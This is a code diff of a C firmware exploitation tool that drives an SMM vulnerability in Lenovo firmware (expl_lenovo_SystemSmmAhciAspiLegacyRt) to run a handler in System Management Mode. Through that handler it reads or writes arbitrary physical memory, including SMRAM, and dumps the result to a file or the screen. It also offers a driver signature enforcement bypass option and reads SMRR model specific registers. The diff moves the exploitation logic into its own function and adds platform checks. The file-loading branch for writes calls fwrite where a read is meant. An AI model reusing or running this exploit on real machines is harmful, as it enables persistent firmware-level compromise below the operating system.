@@ -10,6 +10,12 @@
 // make crt functions inline
 #pragma intrinsic(memcpy)
 
+// SMM related model specific registers of Intel
+#define IA32_SMRR_PHYSBASE              0x1F2 // SMRR base address
+#define IA32_SMRR_PHYSMASK              0x1F3 // SMRR range mask
+#define MTRRCAP                         0xFE  // MTRR capabilities
+
+// commands to smm_handler()
 #define SMM_HANDLER_OP_NONE             0   // do nothing, just check for successful exploitation
 #define SMM_HANDLER_OP_PHYS_MEM_READ    1   // read physical memory from SMM
 #define SMM_HANDLER_OP_PHYS_MEM_WRITE   2   // write physical memory from SMM
@@ -106,9 +112,9 @@ static void smm_handler(void *context)
     handler_context->status = status;
 }
 //--------------------------------------------------------------------------------------
-bool test(void)
+int test(void)
 {
-    bool ret = false;
+    int ret = -1;
 
     printf("**************************************\n");
     printf("Running tests...\n");
@@ -139,7 +145,7 @@ bool test(void)
 
                 if (high == 0x08070605 && low == 0x04030201)
                 {
-                    ret = true;
+                    ret = 0;
                 }
             }
             else
@@ -156,7 +162,7 @@ bool test(void)
         }
     }
 
-    if (!ret)
+    if (ret != 0)
     {
         fprintf(stderr, __FUNCTION__"(): Error in test #1\n");
         goto _end;
@@ -165,7 +171,7 @@ bool test(void)
     /*
         Test PCI config space and I/O ports API.
     */
-    ret = false;
+    ret = -1;
 
     {
         unsigned int pci_addr = PCI_ADDR(0, 0, 0, 0);
@@ -192,7 +198,7 @@ bool test(void)
                     if (vid == (unsigned short)((val >> 0) & 0xffff) &&
                         did == (unsigned short)((val >> 16) & 0xffff))
                     {
-                        ret = true;
+                        ret = 0;
                     }
                 }
                 else
@@ -211,7 +217,7 @@ bool test(void)
         }
     }
 
-    if (!ret)
+    if (ret != 0)
     {
         fprintf(stderr, __FUNCTION__"(): Error in test #2\n");
         goto _end;
@@ -220,7 +226,7 @@ bool test(void)
     /*
         Test memory alloc/free and virtual to physical address translation.
     */
-    ret = false;
+    ret = -1;
 
     {
         unsigned long long addr = 0, phys_addr = 0;
@@ -235,7 +241,10 @@ bool test(void)
             {
                 printf(__FUNCTION__"(): Physical address for 0x%llx is 0x%llx\n", addr, phys_addr_2);
 
-                ret = phys_addr == phys_addr_2;
+                if (phys_addr == phys_addr_2)
+                {
+                    ret = 0;
+                }
             }
             else
             {
@@ -253,16 +262,156 @@ bool test(void)
         }
     }
 
-    if (!ret)
+    if (ret != 0)
     {
         fprintf(stderr, __FUNCTION__"(): Error in test #3\n");
         goto _end;
     }
 
+    /*
+        Test model specific registers.
+    */
+    ret = -1;
+
+    {
+        unsigned long long base = 0, mask = 0;
+
+        if (uefi_expl_msr_get(IA32_SMRR_PHYSBASE, &base) && uefi_expl_msr_get(IA32_SMRR_PHYSMASK, &mask))
+        {
+            printf(__FUNCTION__"(): IA32_SMRR_PHYSBASE = 0x%llx\n", base);
+            printf(__FUNCTION__"(): IA32_SMRR_PHYSMASK = 0x%llx\n", mask);
+
+            ret = 0;
+        }
+        else
+        {
+            printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
+        }
+    }
+
+    if (ret != 0)
+    {
+        fprintf(stderr, __FUNCTION__"(): Error in test #4\n");
+        goto _end;
+    }
+
 _end:
 
-    printf("%s\n", ret ? "SUCCESS" : "FAILS");
-    printf("**************************************\n");
+    printf("TEST %s\n", (ret == 0) ? "SUCCESS" : "FAILS");
+    printf("*****************************************\n");
+
+    return ret;
+}
+//--------------------------------------------------------------------------------------
+int exploit(PSMM_HANDLER_CONTEXT context, int target, const char *data_file)
+{
+    int ret = -1;
+    PSMM_HANDLER_CONTEXT c = context;
+
+    // determinate memory size required for SMM_HANDLER_CONTEXT
+    unsigned int new_size = sizeof(SMM_HANDLER_CONTEXT);
+
+    if (context->op == SMM_HANDLER_OP_PHYS_MEM_READ ||
+        context->op == SMM_HANDLER_OP_PHYS_MEM_WRITE)
+    {
+        new_size += (context->op == SMM_HANDLER_OP_PHYS_MEM_READ) ?
+            context->phys_mem_read.size :
+            context->phys_mem_write.size;
+    }
+
+    // to make uefi_expl_mem_alloc() happy
+    new_size = XALIGN_UP(new_size, PAGE_SIZE);
+
+    if (new_size > sizeof(SMM_HANDLER_CONTEXT))
+    {
+        if ((c = (PSMM_HANDLER_CONTEXT)malloc(new_size)) == NULL)
+        {
+            return -1;
+        }
+
+        memset(c, 0, new_size);
+        memcpy(c, context, sizeof(SMM_HANDLER_CONTEXT));
+
+        // read input file to write into the SMRAM
+        if (c->op == SMM_HANDLER_OP_PHYS_MEM_WRITE)
+        {
+            FILE *f = fopen(data_file, "rb");
+            if (f)
+            {
+                fwrite(c->phys_mem_write.data, 1, c->phys_mem_write.size, f);
+                fclose(f);
+
+                printf("%d bytes readed to the \"%s\"\n", c->phys_mem_write.size, data_file);
+            }
+            else
+            {
+                printf("ERROR: Unable to open input file \"%s\"\n", data_file);
+                return -1;
+            }
+        }
+    }
+
+    unsigned long long addr = 0, phys_addr = 0;
+
+    // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
+    if (uefi_expl_mem_alloc(new_size, &addr, &phys_addr))
+    {
+        if (uefi_expl_phys_mem_write(phys_addr, new_size, (unsigned char *)c))
+        {
+            // run exploit
+            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, smm_handler, (void *)phys_addr))
+            {
+                // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
+                if (uefi_expl_phys_mem_read(phys_addr, new_size, (unsigned char *)c))
+                {
+                    if (c->op == SMM_HANDLER_OP_PHYS_MEM_READ)
+                    {
+                        if (data_file)
+                        {
+                            // save readed memory to file
+                            FILE *f = fopen(data_file, "wb");
+                            if (f)
+                            {
+                                fwrite(c->phys_mem_read.data, 1, c->phys_mem_read.size, f);
+                                fclose(f);
+
+                                printf("%d bytes written to the \"%s\"\n", c->phys_mem_read.size, data_file);
+                            }
+                            else
+                            {
+                                printf("ERROR: Unable to create output file \"%s\"\n", data_file);
+                                return -1;
+                            }
+                        }
+                        else
+                        {
+                            // print readed memory to screen
+                            hexdump(c->phys_mem_read.data, c->phys_mem_read.size);
+                        }
+                    }
+
+                    ret = 0;
+                }
+                else
+                {
+                    printf("ERROR: uefi_expl_mem_read() fails\n");
+                }
+            }
+        }
+        else
+        {
+            printf("ERROR: uefi_expl_mem_write() fails\n");
+        }
+    }
+    else
+    {
+        printf("ERROR: uefi_expl_mem_alloc() fails\n");
+    }
+
+    if (new_size > sizeof(SMM_HANDLER_CONTEXT))
+    {
+        free(c);
+    }
 
     return ret;
 }
@@ -270,7 +419,7 @@ _end:
 int _tmain(int argc, _TCHAR* argv[])
 {
     int ret = -1, target = -1;    
-    SMM_HANDLER_CONTEXT context, *c = &context;
+    SMM_HANDLER_CONTEXT context;
     const char *data_file = NULL;
     bool use_dse_bypass = false, use_test = false;
 
@@ -418,118 +567,36 @@ int _tmain(int argc, _TCHAR* argv[])
     // initialize HAL
     if (uefi_expl_init(NULL, use_dse_bypass))
     {    
+        unsigned long long val = 0;
+
         if (use_test)
         {
             // run tests and exit
-            test();
-            goto _end;
+            ret = test();
         }
-
-        // determinate memory size required for SMM_HANDLER_CONTEXT
-        unsigned int new_size = sizeof(SMM_HANDLER_CONTEXT);        
-
-        if (context.op == SMM_HANDLER_OP_PHYS_MEM_READ ||
-            context.op == SMM_HANDLER_OP_PHYS_MEM_WRITE)            
+        else if (uefi_expl_pci_read(PCI_ADDR(0, 0, 0, 0), U32, &val))
         {
-            new_size += (context.op == SMM_HANDLER_OP_PHYS_MEM_READ) ? 
-                                       context.phys_mem_read.size :
-                                       context.phys_mem_write.size;            
-        }
+            unsigned short vid = (unsigned short)((val >> 0) & 0xffff),
+                           did = (unsigned short)((val >> 16) & 0xffff);
 
-        // to make uefi_expl_mem_alloc() happy
-        new_size = XALIGN_UP(new_size, PAGE_SIZE);
-
-        if (new_size > sizeof(SMM_HANDLER_CONTEXT))
-        {
-            if ((c = (SMM_HANDLER_CONTEXT *)malloc(new_size)) == NULL)
+            printf("Host bridge VID = 0x%.4x, DID = 0x%.4x\n", vid, did);
+            
+            // check for Intel VID
+            if (vid == 0x8086)
             {
-                return -1;
-            }
-
-            memset(c, 0, new_size);
-            memcpy(c, &context, sizeof(context));
-
-            // read input file to write into the SMRAM
-            if (context.op == SMM_HANDLER_OP_PHYS_MEM_WRITE)
-            {
-                FILE *f = fopen(data_file, "rb");
-                if (f)
-                {
-                    fwrite(c->phys_mem_write.data, 1, c->phys_mem_write.size, f);
-                    fclose(f);
-
-                    printf("%d bytes readed to the \"%s\"\n", c->phys_mem_write.size, data_file);
-                }
-                else
-                {
-                    printf("ERROR: Unable to open input file \"%s\"\n", data_file);
-                    return -1;
-                }
-            }
-        }
-
-        unsigned long long addr = 0, phys_addr = 0;
-
-        // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
-        if (uefi_expl_mem_alloc(new_size, &addr, &phys_addr))
-        {
-            if (uefi_expl_phys_mem_write(phys_addr, new_size, (unsigned char *)c))
-            {
-                // run exploit
-                if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, smm_handler, (void *)phys_addr))
-                {
-                    // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
-                    if (uefi_expl_phys_mem_read(phys_addr, new_size, (unsigned char *)c))
-                    {
-                        if (c->op == SMM_HANDLER_OP_PHYS_MEM_READ)
-                        {
-                            if (data_file)
-                            {
-                                // save readed memory to file
-                                FILE *f = fopen(data_file, "wb");
-                                if (f)
-                                {
-                                    fwrite(c->phys_mem_read.data, 1, c->phys_mem_read.size, f);
-                                    fclose(f);
-
-                                    printf("%d bytes written to the \"%s\"\n", c->phys_mem_read.size, data_file);
-                                }
-                                else
-                                {
-                                    printf("ERROR: Unable to create output file \"%s\"\n", data_file);
-                                    return -1;
-                                }
-                            }
-                            else
-                            {
-                                // print readed memory to screen
-                                hexdump(c->phys_mem_read.data, c->phys_mem_read.size);
-                            }                            
-                        }
-
-                        ret = 0;
-                    }
-                    else
-                    {
-                        printf("ERROR: uefi_expl_mem_read() fails\n");
-                    }
-                }                
+                // run exploitation
+                ret = exploit(&context, target, data_file);
             }
             else
             {
-                printf("ERROR: uefi_expl_mem_write() fails\n");
+                printf("ERROR: Unsupported platform\n");
             }
-        }        
+        }               
         else
         {
-            printf("ERROR: uefi_expl_mem_alloc() fails\n");
+            printf("ERROR: uefi_expl_pci_read() fails\n");
         }
 
-        if (new_size > sizeof(SMM_HANDLER_CONTEXT))
-        {
-            free(c);
-        }
-_end:
         // uninitialize HAL
         uefi_expl_uninit();
     }
